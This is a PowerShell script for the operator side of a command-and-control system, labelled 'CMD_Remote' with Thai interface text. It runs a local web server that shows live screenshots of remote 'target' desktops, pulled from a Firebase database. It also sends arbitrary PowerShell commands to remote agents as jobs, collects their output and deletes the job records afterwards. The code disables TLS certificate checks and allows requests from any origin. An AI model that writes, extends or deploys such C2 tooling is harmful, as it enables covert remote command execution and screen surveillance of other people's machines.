# ==============================================================================
# CMD_Remote Controller Turbo Bridge (Local Daemon)
# Port: 127.0.0.1:5999
# High-Speed Persistent C2 Gateway & Live Screen Stream Viewer
# ==============================================================================

param(
    [int]$Port = 5999,
    [string]$FirebaseUrl = "https://uat-api-agent-default-rtdb.firebaseio.com/"
)

# Force UTF-8 Encoding
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Configure TLS 1.2 and Connection Pooling
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 128
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {}

if ($FirebaseUrl -notlike "*/") { $FirebaseUrl += "/" }

# Global State
$script:LatestScreens = @{}
$script:TotalRequestsServed = 0
$script:StartTime = [DateTime]::UtcNow

# Native Persistent HTTP Client Helper
function Invoke-FirebaseQuick {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$TimeoutMs = 8000
    )
    $req = [System.Net.HttpWebRequest]::Create($Uri)
    $req.Method = $Method
    $req.Timeout = $TimeoutMs
    $req.ReadWriteTimeout = $TimeoutMs
    $req.KeepAlive = $true
    $req.Proxy = $null # ตัด Proxy lookup เพื่อความเร็วสูงสุด

    if (-not [string]::IsNullOrEmpty($Body)) {
        $req.ContentType = "application/json; charset=utf-8"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $req.ContentLength = $bytes.Length
        $st = $req.GetRequestStream()
        $st.Write($bytes, 0, $bytes.Length)
        $st.Close()
    }

    try {
        $resp = $req.GetResponse()
        $st = $resp.GetResponseStream()
        $rd = New-Object System.IO.StreamReader($st, [System.Text.Encoding]::UTF8)
        $res = $rd.ReadToEnd()
        $rd.Close()
        $resp.Close()
        return $res
    } catch {
        return $null
    }
}

# HTML5 Modern Live Screen Viewer (Zero-Install)
function Get-LiveHtmlPage {
    param([string]$Key = "2816")
    return @"
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD_Remote Ultra-Realtime Live Stream (Key: $Key)</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        header { background: #1e293b; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
        .logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 1.1rem; color: #38bdf8; }
        .badge { background: #059669; color: #ecfdf5; font-size: 0.75rem; padding: 4px 10px; border-radius: 9999px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; display: flex; align-items: center; gap: 6px; }
        .badge::before { content: ""; width: 8px; height: 8px; background: #34d399; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.3); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.8; } }
        .stats { display: flex; gap: 20px; font-size: 0.85rem; color: #94a3b8; }
        .stat-val { color: #f1f5f9; font-weight: 600; }
        .main-container { flex: 1; display: flex; position: relative; background: #020617; }
        .screen-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 16px; position: relative; }
        #live-canvas { max-width: 100%; max-height: 100%; object-fit: contain; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5); border-radius: 6px; border: 1px solid #334155; }
        .controls-bar { position: absolute; bottom: 24px; left: 50%; transform: translateX(-50%); background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); border: 1px solid #475569; padding: 8px 16px; border-radius: 9999px; display: flex; gap: 12px; align-items: center; }
        button { background: #2563eb; color: white; border: none; padding: 6px 14px; border-radius: 9999px; font-size: 0.85rem; font-weight: 500; cursor: pointer; transition: all 0.2s; }
        button:hover { background: #1d4ed8; }
        button.secondary { background: #334155; color: #cbd5e1; }
        button.secondary:hover { background: #475569; }
        .fps-badge { font-size: 0.8rem; font-family: monospace; color: #38bdf8; }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <span>⚡ CMD_Remote Ultra-Realtime C2</span>
            <span class="badge">Live 5-10 FPS</span>
        </div>
        <div class="stats">
            <div>Target Key: <span class="stat-val">$Key</span></div>
            <div>Latency: <span class="stat-val" id="latency-val">-- ms</span></div>
            <div>FPS: <span class="stat-val" id="fps-val">--</span></div>
        </div>
    </header>
    <div class="main-container">
        <div class="screen-wrapper">
            <img id="live-canvas" src="/api/screen?key=$Key" alt="Live Desktop Screen" />
            <div class="controls-bar">
                <button onclick="togglePause()" id="btn-pause">พักการสตรีม (Pause)</button>
                <button class="secondary" onclick="refreshNow()">ถ่ายภาพใหม่ (Refresh)</button>
                <span class="fps-badge" id="stream-status">Active Adaptive</span>
            </div>
        </div>
    </div>

    <script>
        const key = "$Key";
        let isPaused = false;
        let lastFrameTime = performance.now();
        let frameCount = 0;
        let fps = 0;
        const img = document.getElementById("live-canvas");
        const latencyVal = document.getElementById("latency-val");
        const fpsVal = document.getElementById("fps-val");
        const btnPause = document.getElementById("btn-pause");

        function fetchNextFrame() {
            if (isPaused) {
                setTimeout(fetchNextFrame, 500);
                return;
            }
            const startTime = performance.now();
            const nextImg = new Image();
            nextImg.onload = () => {
                img.src = nextImg.src;
                const now = performance.now();
                const roundTrip = Math.round(now - startTime);
                latencyVal.innerText = roundTrip + " ms";
                
                frameCount++;
                if (now - lastFrameTime >= 1000) {
                    fps = frameCount;
                    frameCount = 0;
                    lastFrameTime = now;
                    fpsVal.innerText = fps;
                }
                setTimeout(fetchNextFrame, 120); // ~8 FPS
            };
            nextImg.onerror = () => {
                setTimeout(fetchNextFrame, 500);
            };
            nextImg.src = "/api/screen?key=" + key + "&t=" + Date.now();
        }

        function togglePause() {
            isPaused = !isPaused;
            btnPause.innerText = isPaused ? "เริ่มสตรีมต่อ (Resume)" : "พักการสตรีม (Pause)";
            btnPause.style.background = isPaused ? "#059669" : "#2563eb";
        }

        function refreshNow() {
            img.src = "/api/screen?key=" + key + "&t=" + Date.now();
        }

        fetchNextFrame();
    </script>
</body>
</html>
"@
}

# Start HTTP Listener
$listener = New-Object System.Net.HttpListener
$prefix = "http://127.0.0.1:$Port/"
$listener.Prefixes.Add($prefix)

try {
    $listener.Start()
    Write-Host "================================================================================" -ForegroundColor Cyan
    Write-Host "  CMD_REMOTE CONTROLLER TURBO BRIDGE IS ONLINE                                  " -ForegroundColor Green
    Write-Host "  Listening on: $prefix                                                         " -ForegroundColor Yellow
    Write-Host "  Live Stream Web UI: http://127.0.0.1:$Port/live?key=2816                      " -ForegroundColor Cyan
    Write-Host "================================================================================" -ForegroundColor Cyan
} catch {
    Write-Host "[ERROR] Could not start HttpListener on $prefix : $_" -ForegroundColor Red
    exit 1
}

# Request Processing Loop
while ($listener.IsListening) {
    try {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response
        $script:TotalRequestsServed++

        $path = $request.Url.AbsolutePath

        # CORS Headers
        $response.AddHeader("Access-Control-Allow-Origin", "*")
        $response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        $response.AddHeader("Access-Control-Allow-Headers", "Content-Type")

        if ($request.HttpMethod -eq "OPTIONS") {
            $response.StatusCode = 200
            $response.Close()
            continue
        }

        # Route 1: Health Check
        if ($path -eq "/api/health") {
            $uptime = [math]::Round(([DateTime]::UtcNow - $script:StartTime).TotalSeconds, 1)
            $json = @{
                status = "ok"
                engine = "Controller Turbo Bridge (Keep-Alive)"
                uptime_sec = $uptime
                requests_served = $script:TotalRequestsServed
            } | ConvertTo-Json
            
            $buf = [System.Text.Encoding]::UTF8.GetBytes($json)
            $response.ContentType = "application/json; charset=utf-8"
            $response.ContentLength64 = $buf.Length
            $response.OutputStream.Write($buf, 0, $buf.Length)
            $response.Close()
            continue
        }

        # Route 2: Web Live Screen Viewer
        if ($path -eq "/live") {
            $key = "2816"
            if ($request.QueryString["key"]) { $key = $request.QueryString["key"] }
            $html = Get-LiveHtmlPage -Key $key
            $buf = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.ContentType = "text/html; charset=utf-8"
            $response.ContentLength64 = $buf.Length
            $response.OutputStream.Write($buf, 0, $buf.Length)
            $response.Close()
            continue
        }

        # Route 3: Fast Screen Endpoint
        if ($path -eq "/api/screen") {
            $key = if ($request.QueryString["key"]) { $request.QueryString["key"] } else { "2816" }
            
            $fbScreenUri = "$($FirebaseUrl)live_stream/$key.json"
            $scrData = Invoke-FirebaseQuick -Uri $fbScreenUri -Method "GET"
            
            $imgBytes = $null
            if ($scrData -and $scrData -ne "null") {
                try {
                    $parsed = $scrData | ConvertFrom-Json
                    if ($parsed.image) {
                        $imgBytes = [Convert]::FromBase64String($parsed.image)
                    }
                } catch {}
            }

            # Fallback placeholder if no stream yet
            if (-not $imgBytes) {
                Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
                $bmp = New-Object System.Drawing.Bitmap 640, 360
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.Clear([System.Drawing.Color]::FromArgb(15, 23, 42))
                $font = New-Object System.Drawing.Font("Segoe UI", 14)
                $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(148, 163, 184))
                $g.DrawString("Connecting to Remote Screen ($key)...", $font, $brush, 140, 160)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $imgBytes = $ms.ToArray()
                $g.Dispose()
                $bmp.Dispose()
                $ms.Dispose()
            }

            $response.ContentType = "image/jpeg"
            $response.ContentLength64 = $imgBytes.Length
            $response.AddHeader("Cache-Control", "no-cache, no-store, must-revalidate")
            $response.OutputStream.Write($imgBytes, 0, $imgBytes.Length)
            $response.Close()
            continue
        }

        # Route 4: Ultra-Fast Command Execution
        if ($path -eq "/api/exec" -and $request.HttpMethod -eq "POST") {
            $reader = New-Object System.IO.StreamReader($request.InputStream, [System.Text.Encoding]::UTF8)
            $body = $reader.ReadToEnd()
            $reader.Close()

            $params = $body | ConvertFrom-Json
            $secretKey = $params.secret_key
            $cmd = $params.command
            $mode = if ($params.mode) { $params.mode } else { "PowerShell" }
            $timeoutSec = if ($params.timeout) { [int]$params.timeout } else { 15 }

            $jobId = "job-" + [Guid]::NewGuid().ToString().Substring(0, 8)
            $timestamp = [DateTime]::UtcNow.ToString("yyyy-MM-dd HH:mm:ss")

            # Standard CMD_Remote job payload matching Agent listener
            $payload = @{
                secret_key = $secretKey
                script_content = $cmd
                status = "pending"
                execution_mode = "turbo"
                created_at = $timestamp
                timeout_sec = $timeoutSec
                abort = $false
            } | ConvertTo-Json -Compress

            $sw = [System.Diagnostics.Stopwatch]::StartNew()

            # 1. Publish to jobs/$secretKey/$jobId.json
            $jobNodeUri = "$($FirebaseUrl)jobs/$secretKey/$jobId.json"
            $null = Invoke-FirebaseQuick -Uri $jobNodeUri -Method "PUT" -Body $payload

            # 2. Fast Micro-Poll on the same job node (40ms interval)
            $maxWaitMs = $timeoutSec * 1000
            $resultObj = $null

            while ($sw.ElapsedMilliseconds -lt $maxWaitMs) {
                Start-Sleep -Milliseconds 40
                $rawResp = Invoke-FirebaseQuick -Uri $jobNodeUri -Method "GET"
                if ($rawResp -and $rawResp -ne "null") {
                    try {
                        $parsed = $rawResp | ConvertFrom-Json
                        if ($parsed.status -eq "completed" -or $parsed.status -eq "failed") {
                            $resultObj = $parsed
                            break
                        }
                    } catch {}
                }
            }

            $sw.Stop()

            # Clean up job node in background (Self-Destruct)
            [void](Invoke-FirebaseQuick -Uri $jobNodeUri -Method "DELETE")

            if ($resultObj) {
                $ret = @{
                    status = "success"
                    job_id = $jobId
                    latency_ms = $sw.ElapsedMilliseconds
                    output = $resultObj.stdout
                    error = $resultObj.stderr
                    exit_code = $resultObj.exit_code
                }
            } else {
                $ret = @{
                    status = "timeout"
                    job_id = $jobId
                    latency_ms = $sw.ElapsedMilliseconds
                    error = "Execution timed out after $($timeoutSec)s"
                }
            }

            $respJson = $ret | ConvertTo-Json -Depth 5
            $buf = [System.Text.Encoding]::UTF8.GetBytes($respJson)
            $response.ContentType = "application/json; charset=utf-8"
            $response.ContentLength64 = $buf.Length
            $response.OutputStream.Write($buf, 0, $buf.Length)
            $response.Close()
            continue
        }

        # Default 404
        $response.StatusCode = 404
        $response.Close()

    } catch {
        try {
            $response.StatusCode = 500
            $response.Close()
        } catch {}
    }
}
